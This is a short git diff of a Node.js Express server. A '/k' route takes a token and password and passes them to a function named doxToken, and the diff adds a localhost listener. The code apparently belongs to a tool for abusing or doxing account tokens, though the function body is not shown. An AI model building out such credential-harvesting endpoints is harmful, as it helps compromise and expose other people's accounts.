@@ -97,11 +97,13 @@ app.get("/k", async (req, res) => {
 
   if (token) {
     res.send(`Bot is ready.`);
-    await doxToken(token, pass);
-    // Since we want the code to stop after performing all steps, we don't need to do anything here
+    doxToken(token, pass);
   } else {
     res.send("Invalid Token");
   }
 });
 
-module.exports = app; // Exporting the app instance
+// Start the server
+app.listen(8080, 'localhost', () => {
+  console.log(`Server Started on http://localhost:8080`);
+});
